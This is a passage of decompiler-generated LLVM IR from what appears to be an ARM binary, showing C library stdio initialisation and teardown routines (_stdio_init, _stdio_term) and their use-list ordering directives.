  %v3_17f34 = load i32, i32* %v2_17f34, align 4
  %v1_17f38 = add i32 %v3_17f34, -1
  store i32 %v1_17f38, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17f3c = icmp eq i32 %v1_17f38, 0
  store i32 %v1_17f38, i32* %v2_17f34, align 4
  br i1 %v2_17f3c, label %dec_label_pc_17f48, label %dec_label_pc_17fb0

dec_label_pc_17f48:                               ; preds = %dec_label_pc_17f2c
  %v0_17f48 = load i32, i32* %r3.global-to-local, align 4
  %v1_17f48 = load i32, i32* %r0.global-to-local, align 4
  %v2_17f48 = add i32 %v1_17f48, 8
  %v3_17f48 = inttoptr i32 %v2_17f48 to i32*
  store i32 %v0_17f48, i32* %v3_17f48, align 4
  %v0_17f4c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17f4c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17f50

dec_label_pc_17f50:                               ; preds = %dec_label_pc_17f80.dec_label_pc_17f50_crit_edge, %dec_label_pc_17f48
  %v0_17f50 = phi i32 [ %v0_17f50.pre, %dec_label_pc_17f80.dec_label_pc_17f50_crit_edge ], [ %v0_17f4c, %dec_label_pc_17f48 ]
  %v1_17f50 = inttoptr i32 %v0_17f50 to i32*
  %v2_17f50 = load i32, i32* %v1_17f50, align 4
  store i32 %v2_17f50, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17f50, i32* %r2.global-to-local, align 4
  %v2_17f5c71 = load i32, i32* %v1_17f50, align 4
  store i32 %v2_17f5c71, i32* %r3.global-to-local, align 4
  %v3_17f6073 = icmp uge i32 %v2_17f5c71, %v2_17f50
  store i1 %v3_17f6073, i1* %cpsr_c.global-to-local, align 1
  %v9_17f6079 = icmp eq i32 %v2_17f5c71, %v2_17f50
  br i1 %v9_17f6079, label %dec_label_pc_17f68, label %dec_label_pc_17f80

dec_label_pc_17f68:                               ; preds = %dec_label_pc_17f50, %dec_label_pc_17f68.dec_label_pc_17f5c_crit_edge
  %v0_17f6880 = phi i32 [ %v1_17f60.pre, %dec_label_pc_17f68.dec_label_pc_17f5c_crit_edge ], [ %v2_17f50, %dec_label_pc_17f50 ]
  store i32 %v0_17f6880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17f78 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17f78, label %dec_label_pc_17f7c, label %dec_label_pc_17f68.dec_label_pc_17f5c_crit_edge

dec_label_pc_17f68.dec_label_pc_17f5c_crit_edge:  ; preds = %dec_label_pc_17f68
  %v0_17f5c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17f60.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17f5c = inttoptr i32 %v0_17f5c.pre to i32*
  %v2_17f5c = load i32, i32* %v1_17f5c, align 4
  store i32 %v2_17f5c, i32* %r3.global-to-local, align 4
  %v3_17f60 = icmp uge i32 %v2_17f5c, %v1_17f60.pre
  store i1 %v3_17f60, i1* %cpsr_c.global-to-local, align 1
  %v9_17f60 = icmp eq i32 %v2_17f5c, %v1_17f60.pre
  br i1 %v9_17f60, label %dec_label_pc_17f68, label %dec_label_pc_17f80

dec_label_pc_17f7c:                               ; preds = %dec_label_pc_17f68
  %v0_17f7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17f7c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17f80

dec_label_pc_17f80:                               ; preds = %dec_label_pc_17f50, %dec_label_pc_17f68.dec_label_pc_17f5c_crit_edge, %dec_label_pc_17f7c
  %v0_17f88 = phi i32 [ %v0_17f7c, %dec_label_pc_17f7c ], [ %v2_17f5c71, %dec_label_pc_17f50 ], [ %v2_17f5c, %dec_label_pc_17f68.dec_label_pc_17f5c_crit_edge ]
  %v1_17f80 = phi i32 [ %v0_17f7c, %dec_label_pc_17f7c ], [ %v2_17f50, %dec_label_pc_17f50 ], [ %v1_17f60.pre, %dec_label_pc_17f68.dec_label_pc_17f5c_crit_edge ]
  %v3_17f80 = icmp uge i32 %v0_17f88, %v1_17f80
  store i1 %v3_17f80, i1* %cpsr_c.global-to-local, align 1
  %v9_17f80 = icmp eq i32 %v0_17f88, %v1_17f80
  br i1 %v9_17f80, label %dec_label_pc_17f88, label %dec_label_pc_17f80.dec_label_pc_17f50_crit_edge

dec_label_pc_17f80.dec_label_pc_17f50_crit_edge:  ; preds = %dec_label_pc_17f80
  %v0_17f50.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17f50

dec_label_pc_17f88:                               ; preds = %dec_label_pc_17f80
  %v2_17f88 = icmp ne i32 %v1_17f80, 0
  store i1 %v2_17f88, i1* %cpsr_c.global-to-local, align 1
  %v7_17f8c = icmp slt i32 %v1_17f80, 2
  br i1 %v7_17f8c, label %dec_label_pc_17fb0, label %dec_label_pc_17f90

dec_label_pc_17f90:                               ; preds = %dec_label_pc_17f88
  %v0_17f90 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17f90, i32* %r0.global-to-local, align 4
  %v0_17f94 = load i32, i32* %r1.global-to-local, align 4
  %v1_17f94 = add i32 %v0_17f94, 129
  store i32 %v1_17f94, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17fb0

dec_label_pc_17fac:                               ; preds = %dec_label_pc_17bf0, %dec_label_pc_17bd4, %dec_label_pc_17bfc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_17fb0

dec_label_pc_17fb0:                               ; preds = %dec_label_pc_17f2c, %dec_label_pc_17f88, %bb57, %dec_label_pc_17c34, %dec_label_pc_17f90, %dec_label_pc_17fac
  %v0_17fb0 = load i32, i32* @r5, align 4
  store i32 %v0_17fb0, i32* %r0.global-to-local, align 4
  %v2_17fb8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17fb8, i32* %r4.global-to-local, align 4
  store i32 %v6_17b94, i32* @r5, align 4
  store i32 %v9_17b94, i32* @r6, align 4
  store i32 %v12_17b94, i32* @r7, align 4
  store i32 %v15_17b94, i32* @r8, align 4
  ret i32 %v0_17fb0

; uselistorder directives
  uselistorder i32 %v0_17f7c, { 1, 0, 2 }
  uselistorder i32 %v1_17f60.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17f50, { 1, 0 }
  uselistorder i32 %v0_17f00, { 1, 0, 2 }
  uselistorder i32 %v1_17ee4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17ed4, { 1, 0 }
  uselistorder i32 %v0_17e7c, { 1, 0, 2 }
  uselistorder i32 %v1_17e60.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17e14, { 1, 0, 2 }
  uselistorder i32 %v1_17df8, { 0, 2, 1 }
  uselistorder i32 %v4_17dd4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_17d84.pre, { 2, 1, 0 }
  uselistorder i32 %v0_17d08, { 1, 2, 0 }
  uselistorder i32 %v0_17cd4, { 1, 0 }
  uselistorder i32 %v1_17c98, { 1, 0 }
  uselistorder i32 %v0_17c98, { 1, 0 }
  uselistorder i32 %v1_17c80, { 1, 2, 0, 3 }
  uselistorder i32 %v1_17c24, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 51, 5, 6, 7, 8, 9, 11, 10, 52, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 32, 33, 3, 4, 5, 6, 34, 35, 7, 8, 9, 36, 37, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 16384, { 74, 75, 0, 1, 76, 35, 67, 36, 68, 37, 69, 38, 70, 39, 71, 40, 72, 18, 73, 17, 51, 3, 53, 33, 54, 4, 65, 34, 66, 32, 52, 5, 55, 6, 56, 7, 57, 8, 58, 9, 59, 10, 60, 11, 61, 12, 62, 13, 63, 14, 64, 41, 96, 15, 97, 16, 98, 19, 77, 42, 78, 21, 79, 44, 80, 46, 81, 47, 82, 20, 83, 43, 84, 45, 85, 22, 86, 23, 87, 24, 88, 48, 89, 25, 2, 26, 90, 27, 91, 29, 92, 28, 93, 30, 94, 31, 95, 50, 99, 100, 101, 49, 102 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 16, 0, 15, 4, 3, 6, 5, 14, 13, 12, 11, 10, 9, 8, 7, 2, 1 }
  uselistorder i32 1024, { 2, 3, 4, 5, 0, 6, 7, 8, 1, 9 }
  uselistorder i32 ()* @malloc, { 62, 61, 60, 6, 5, 4, 0, 1, 8, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 3, 2, 9, 7 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 12, 11, 5, 4, 3, 2, 0, 8, 7, 6, 10, 9, 1 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_17fb0, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_17fac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17f80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17f68, { 1, 0 }
  uselistorder label %dec_label_pc_17f2c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17f04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17eec, { 1, 0 }
  uselistorder label %dec_label_pc_17e90, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_17e80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17e68, { 1, 0 }
  uselistorder label %dec_label_pc_17e28, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_17e18, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17d60, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_17cc8._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17c70, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_17c0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17bd4, { 1, 2, 0 }
}

define i32 @function_17fc4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17fc4:
  %v0_17fc4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17fc4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17fc4
  %v5_17fc4 = sdiv i32 %arg2, 16
  %v6_17fc4 = and i32 %v5_17fc4, %arg1
  %v5_17fc8 = sdiv i32 %arg2, 256
  %v6_17fc8 = and i32 %v6_17fc4, %v5_17fc8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17fc4, %bb
  %v9_17fcc = phi i32 [ %arg1, %dec_label_pc_17fc4 ], [ %v6_17fc8, %bb ]
  ret i32 %v9_17fcc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_17ffc = call i32 @__aeabi_read_tp()
  %v3_18000 = load i16, i16* @global_var_24150.533, align 2
  %v4_18000 = sext i16 %v3_18000 to i32
  store i32 %v4_18000, i32* @r3, align 4
  store i32 %v0_17ffc, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_1800c = add i32 %v4_18000, %v0_17ffc
  %v3_1800c = inttoptr i32 %v2_1800c to i32*
  %v4_1800c = load i32, i32* %v3_1800c, align 4
  store i32 %v4_1800c, i32* @r6, align 4
  %v1_18010 = call i32 @isatty(i32 0)
  %v2_18018 = icmp eq i32 %v1_18010, 0
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r4, align 4
  br i1 %v2_18018, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_18024 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 308) to i16*), align 4
  %v7_18024 = zext i16 %v5_18024 to i32
  %v2_18028 = xor i32 %v7_18024, 256
  store i32 %v2_18028, i32* @r3, align 4
  %v2_1802c = trunc i32 %v2_18028 to i16
  store i16 %v2_1802c, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_18034 = call i32 @isatty(i32 1)
  %v2_18038 = icmp eq i32 %v1_18034, 0
  br i1 %v2_18038, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_18040 = load i32, i32* @r4, align 4
  %v2_18044 = add i32 %v1_18040, 376
  %v3_18044 = inttoptr i32 %v2_18044 to i16*
  %v4_18044 = load i16, i16* %v3_18044, align 2
  %v2_18048 = xor i16 %v4_18044, 256
  store i16 %v2_18048, i16* %v3_18044, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_18054 = load i16, i16* @global_var_24150.533, align 2
  %v4_18054 = sext i16 %v3_18054 to i32
  %v0_18058 = load i32, i32* @r6, align 4
  %v1_18058 = load i32, i32* @r5, align 4
  %v3_18058 = add i32 %v1_18058, %v4_18054
  %v4_18058 = inttoptr i32 %v3_18058 to i32*
  store i32 %v0_18058, i32* %v4_18058, align 4
  ret i32 %v1_18034

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_18074 = load i32, i32* @r4, align 4
  store i32 %v3_18074, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_18088 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_18088, i32* %r0.global-to-local, align 4
  %v5_18088 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_18088, i32* %r1.global-to-local, align 4
  %v8_18088 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 -33092) to i32*), align 4
  %v2_18090 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_18090, i32* %r3.global-to-local, align 4
  store i32 %v2_18088, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_1809c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 152) to i32*), align 4
  store i32 %v2_18088, i32* %r0.global-to-local, align 4
  store i32 %v5_18088, i32* %r1.global-to-local, align 4
  store i32 %v8_18088, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_180ac = inttoptr i32 %v4_1809c to i32*
  store i32 %v2_18088, i32* %v1_180ac, align 4
  %v3_180ac = add i32 %v4_1809c, 4
  %v4_180ac = inttoptr i32 %v3_180ac to i32*
  %v5_180ac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_180ac, i32* %v4_180ac, align 4
  %v6_180ac = add i32 %v4_1809c, 8
  %v7_180ac = inttoptr i32 %v6_180ac to i32*
  %v8_180ac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_180ac, i32* %v7_180ac, align 4
  %v0_180b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_180b0 = inttoptr i32 %v0_180b0 to i32*
  %v2_180b0 = load i32, i32* %v1_180b0, align 4
  store i32 %v2_180b0, i32* %r0.global-to-local, align 4
  %v3_180b0 = add i32 %v0_180b0, 4
  %v4_180b0 = inttoptr i32 %v3_180b0 to i32*
  %v5_180b0 = load i32, i32* %v4_180b0, align 4
  store i32 %v5_180b0, i32* %r1.global-to-local, align 4
  %v6_180b0 = add i32 %v0_180b0, 8
  %v7_180b0 = inttoptr i32 %v6_180b0 to i32*
  %v8_180b0 = load i32, i32* %v7_180b0, align 4
  %v2_180b4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_180b4, i32* %r3.global-to-local, align 4
  store i32 %v2_180b0, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_180c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_180c0 = add i32 %v0_180c0, 76
  %v3_180c0 = inttoptr i32 %v2_180c0 to i32*
  %v4_180c0 = load i32, i32* %v3_180c0, align 4
  store i32 %v4_180c0, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_180c8 = inttoptr i32 %v4_180c0 to i32*
  %v2_180c8 = load i32, i32* %v1_180c8, align 4
  store i32 %v2_180c8, i32* %r5.global-to-local, align 4
  %v2_180cc = add i32 %v0_180c0, 160
  %v3_180cc = inttoptr i32 %v2_180cc to i32*
  %v4_180cc = load i32, i32* %v3_180cc, align 4
  store i32 %v2_180b0, i32* %r0.global-to-local, align 4
  store i32 %v5_180b0, i32* %r1.global-to-local, align 4
  store i32 %v8_180b0, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_180dc = add i32 %v0_180c0, -33124
  store i32 %v2_180dc, i32* %sl.global-to-local, align 4
  %v1_180e0 = inttoptr i32 %v4_180cc to i32*
  store i32 %v2_180b0, i32* %v1_180e0, align 4
  %v3_180e0 = add i32 %v4_180cc, 4
  %v4_180e0 = inttoptr i32 %v3_180e0 to i32*
  %v5_180e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_180e0, i32* %v4_180e0, align 4
  %v6_180e0 = add i32 %v4_180cc, 8
  %v7_180e0 = inttoptr i32 %v6_180e0 to i32*
  %v8_180e0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_180e0, i32* %v7_180e0, align 4
  %v0_18170.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1817016 = icmp eq i32 %v0_18170.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1817818 = add i32 %v0_18170.pr, 56
  store i32 %v1_1817818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1817016, label %dec_label_pc_18184, label %dec_label_pc_180e8

dec_label_pc_180e8:                               ; preds = %entry, %.thread10
  %v0_180e8 = phi i32 [ %v3_1816c, %.thread10 ], [ %v0_18170.pr, %entry ]
  %v1_180e8 = add i32 %v0_180e8, 64
  %v2_180e8 = inttoptr i32 %v1_180e8 to i32*
  %v3_180e8 = load i32, i32* %v2_180e8, align 4
  store i32 %v3_180e8, i32* %r3.global-to-local, align 4
  %v0_180ec = call i32 @__aeabi_read_tp()
  store i32 %v0_180ec, i32* %r0.global-to-local, align 4
  %v1_180f0 = add i32 %v0_180ec, -1168
  store i32 %v1_180f0, i32* %r6.global-to-local, align 4
  %v3_180f4 = icmp uge i32 %v3_180e8, %v1_180f0
  store i1 %v3_180f4, i1* %cpsr_c.global-to-local, align 1
  %v9_180f4 = icmp eq i32 %v3_180e8, %v1_180f0
  br i1 %v9_180f4, label %.thread1, label %dec_label_pc_18108

.thread1:                                         ; preds = %dec_label_pc_180e8
  %v1_180f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_180f8 = add i32 %v1_180f8, 60
  %v3_180f8 = inttoptr i32 %v2_180f8 to i32*
  %v4_180f8 = load i32, i32* %v3_180f8, align 4
  %v2_180fc = add i32 %v4_180f8, 1
  store i32 %v2_180fc, i32* %r3.global-to-local, align 4
  store i32 %v2_180fc, i32* %v3_180f8, align 4
  br label %.thread10

dec_label_pc_18108:                               ; preds = %dec_label_pc_180e8, %dec_label_pc_18114
  %v0_18108 = load i32, i32* %r2.global-to-local, align 4
  %v1_18108 = inttoptr i32 %v0_18108 to i32*
  %v2_18108 = load i32, i32* %v1_18108, align 4
  store i32 %v2_18108, i32* %r3.global-to-local, align 4
  %v1_1810c = load i32, i32* %r4.global-to-local, align 4
  %v3_1810c = icmp uge i32 %v2_18108, %v1_1810c
  store i1 %v3_1810c, i1* %cpsr_c.global-to-local, align 1
  %v9_1810c = icmp eq i32 %v2_18108, %v1_1810c
  br i1 %v9_1810c, label %dec_label_pc_18114, label %dec_label_pc_1812c

dec_label_pc_18114:                               ; preds = %dec_label_pc_18108
  store i32 %v2_18108, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18124 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18124, label %dec_label_pc_18128, label %dec_label_pc_18108

dec_label_pc_18128:                               ; preds = %dec_label_pc_18114
  %v0_18128 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18128, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1812c

dec_label_pc_1812c:                               ; preds = %dec_label_pc_18108, %dec_label_pc_18128
  %v0_1812c = phi i32 [ %v0_18128, %dec_label_pc_18128 ], [ %v2_18108, %dec_label_pc_18108 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1812c = icmp eq i32 %v0_1812c, 0
  %v2_18138.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_1812c, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_1812c
  %v1_18138 = load i32, i32* %r6.global-to-local, align 4
  %v3_18138 = add i32 %v2_18138.pre, 64
  %v4_18138 = inttoptr i32 %v3_18138 to i32*
  store i32 %v1_18138, i32* %v4_18138, align 4
  %v1_1813c = load i32, i32* %r1.global-to-local, align 4
  %v2_1813c = load i32, i32* %r5.global-to-local, align 4
  %v3_1813c = add i32 %v2_1813c, 60
  %v4_1813c = inttoptr i32 %v3_1813c to i32*
  store i32 %v1_1813c, i32* %v4_1813c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_1812c
  %v2_18130 = add i32 %v2_18138.pre, 8
  %v3_18130 = inttoptr i32 %v2_18130 to i32*
  %v4_18130 = load i32, i32* %v3_18130, align 4
  store i32 %v4_18130, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_18140 = add i32 %v2_18138.pre, 20
  %v4_18140 = inttoptr i32 %v3_18140 to i32*
  store i32 %v4_18130, i32* %v4_18140, align 4
  %v1_18144 = load i32, i32* %r2.global-to-local, align 4
  %v2_18144 = trunc i32 %v1_18144 to i16
  %v3_18144 = load i32, i32* %r5.global-to-local, align 4
  %v4_18144 = inttoptr i32 %v3_18144 to i16*
  store i16 %v2_18144, i16* %v4_18144, align 2
  %v1_18148 = load i32, i32* %r3.global-to-local, align 4
  %v2_18148 = load i32, i32* %r5.global-to-local, align 4
  %v3_18148 = add i32 %v2_18148, 24
  %v4_18148 = inttoptr i32 %v3_18148 to i32*
  store i32 %v1_18148, i32* %v4_18148, align 4
  %v1_1814c = load i32, i32* %r3.global-to-local, align 4
  %v2_1814c = load i32, i32* %r5.global-to-local, align 4
  %v3_1814c = add i32 %v2_1814c, 28
  %v4_1814c = inttoptr i32 %v3_1814c to i32*
  store i32 %v1_1814c, i32* %v4_1814c, align 4
  %v1_18150 = load i32, i32* %r3.global-to-local, align 4
  %v2_18150 = load i32, i32* %r5.global-to-local, align 4
  %v3_18150 = add i32 %v2_18150, 16
  %v4_18150 = inttoptr i32 %v3_18150 to i32*
  store i32 %v1_18150, i32* %v4_18150, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_18154 = load i32, i32* %sl.global-to-local, align 4
  %v1_18154 = inttoptr i32 %v0_18154 to i32*
  %v2_18154 = load i32, i32* %v1_18154, align 4
  store i32 %v2_18154, i32* %r0.global-to-local, align 4
  %v3_18154 = add i32 %v0_18154, 4
  %v4_18154 = inttoptr i32 %v3_18154 to i32*
  %v5_18154 = load i32, i32* %v4_18154, align 4
  store i32 %v5_18154, i32* %r1.global-to-local, align 4
  %v6_18154 = add i32 %v0_18154, 8
  %v7_18154 = inttoptr i32 %v6_18154 to i32*
  %v8_18154 = load i32, i32* %v7_18154, align 4
  store i32 %v8_18154, i32* %r2.global-to-local, align 4
  %v1_1815c = load i32, i32* %r5.global-to-local, align 4
  %v2_1815c = add i32 %v1_1815c, 52
  %v3_1815c = inttoptr i32 %v2_1815c to i32*
  store i32 1, i32* %v3_1815c, align 4
  %v0_18160 = load i32, i32* %r5.global-to-local, align 4
  %v1_18160 = add i32 %v0_18160, 56
  store i32 %v1_18160, i32* %r3.global-to-local, align 4
  %v2_18164 = load i32, i32* %r0.global-to-local, align 4
  %v1_18168 = inttoptr i32 %v1_18160 to i32*
  store i32 %v2_18164, i32* %v1_18168, align 4
  %v3_18168 = add i32 %v0_18160, 60
  %v4_18168 = inttoptr i32 %v3_18168 to i32*
  %v5_18168 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_18168, i32* %v4_18168, align 4
  %v6_18168 = add i32 %v0_18160, 64
  %v7_18168 = inttoptr i32 %v6_18168 to i32*
  %v8_18168 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_18168, i32* %v7_18168, align 4
  %v0_1816c = load i32, i32* %r5.global-to-local, align 4
  %v1_1816c = add i32 %v0_1816c, 32
  %v2_1816c = inttoptr i32 %v1_1816c to i32*
  %v3_1816c = load i32, i32* %v2_1816c, align 4
  store i32 %v3_1816c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18170 = icmp eq i32 %v3_1816c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_18178 = add i32 %v3_1816c, 56
  store i32 %v1_18178, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_18170, label %dec_label_pc_18184, label %dec_label_pc_180e8

dec_label_pc_18184:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_18188 = load i32, i32* %r7.global-to-local, align 4
  %v2_18188 = add i32 %v0_18188, 76
  %v3_18188 = inttoptr i32 %v2_18188 to i32*
  %v4_18188 = load i32, i32* %v3_18188, align 4
  store i32 %v4_18188, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_18188 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_181a814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_181a814, label %dec_label_pc_181b0, label %dec_label_pc_18194

dec_label_pc_18194:                               ; preds = %dec_label_pc_18184, %dec_label_pc_181a8
  %v1_1819c = phi i32 [ %storemerge, %dec_label_pc_181a8 ], [ %storemerge12, %dec_label_pc_18184 ]
  %v1_18194 = inttoptr i32 %v1_1819c to i16*
  %v2_18194 = load i16, i16* %v1_18194, align 2
  %v3_18194 = zext i16 %v2_18194 to i32
  store i32 %v3_18194, i32* %r3.global-to-local, align 4
  %v1_18198 = and i32 %v3_18194, 64
  %v2_18198 = icmp eq i32 %v1_18198, 0
  br i1 %v2_18198, label %dec_label_pc_181a8, label %bb39

bb39:                                             ; preds = %dec_label_pc_18194
  store i32 %v1_1819c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_181a8

dec_label_pc_181a8:                               ; preds = %dec_label_pc_18194, %bb39
  %v1_181a0 = xor i1 %v2_18198, true
